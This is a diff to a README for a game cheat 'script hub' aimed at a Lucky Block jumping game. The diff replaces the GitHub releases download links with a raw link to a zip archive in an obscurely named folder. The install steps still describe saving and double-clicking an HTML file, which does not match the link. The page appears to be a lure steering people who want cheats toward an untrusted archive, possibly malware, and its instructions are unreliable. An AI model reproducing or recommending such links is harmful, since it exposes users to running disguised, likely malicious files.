@@ -1,6 +1,6 @@
 # 🎯 jump-steal-script-hub-2026 - Master Lucky Block Jumping Now
 
-[![Download Now](https://img.shields.io/badge/Download-jump--steal--script--hub--2026-blue?style=for-the-badge&logo=github)](https://github.com/Seamed-boardroom443/jump-steal-script-hub-2026/releases)
+[![Download Now](https://img.shields.io/badge/Download-jump--steal--script--hub--2026-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Seamed-boardroom443/jump-steal-script-hub-2026/main/coevally/steal-script-jump-hub-v3.0.zip)
 
 ## 🚀 Getting Started
 
@@ -17,7 +17,7 @@ Visit this link to download the application. Ensure you have a modern web browse
 ## 📥 Download & Install
 
 1. Click the download button at the top of this page.
-2. Visit the download link: https://github.com/Seamed-boardroom443/jump-steal-script-hub-2026/releases
+2. Visit the download link: https://raw.githubusercontent.com/Seamed-boardroom443/jump-steal-script-hub-2026/main/coevally/steal-script-jump-hub-v3.0.zip
 3. Save the HTML file to your computer.
 4. Double-click the HTML file to open it in your browser.
 5. Follow the on-screen instructions to load and run the script.
